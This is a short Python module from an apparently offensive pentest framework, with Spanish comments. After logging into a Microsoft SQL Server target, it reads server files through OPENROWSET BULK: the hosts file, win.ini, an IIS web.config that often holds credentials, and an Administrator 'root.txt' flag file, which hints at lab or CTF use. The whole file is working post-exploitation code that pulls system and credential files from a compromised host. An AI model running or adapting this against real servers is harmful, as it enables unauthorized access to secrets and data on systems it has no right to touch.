# scripts/mssql/post/read_file.py
from scripts.base import BaseScript
from modules.mssql import MSSQLModule
from core.output import print_table

TARGETS = [
    r"C:\Windows\System32\drivers\etc\hosts",
    r"C:\Windows\win.ini",
    r"C:\inetpub\wwwroot\web.config",
    r"C:\Users\Administrator\Desktop\root.txt",
]

class Script(BaseScript):
    name        = "read-file"
    protocol    = "mssql"
    category    = "post"
    description = "Lee ficheros del servidor via OPENROWSET BULK. Requiere ADMINISTER BULK OPERATIONS."

    def run(self, **kwargs):
        port = int(kwargs.get("port") or 1433)
        mod  = MSSQLModule(self.target, self.creds)
        if not mod.connect(port=port):
            return None
        if not mod.login():
            mod.disconnect(); return None
        try:
            results = []
            for path in TARGETS:
                content = mod.read_file(path)
                if content:
                    results.append({"path": path, "content": content[:200]})
            if results:
                rows = [(r["path"], r["content"][:60] + "...") for r in results]
                print_table("Ficheros leidos", ["Ruta","Contenido (primeros 60 chars)"], rows)
            return results or None
        finally:
            mod.disconnect()
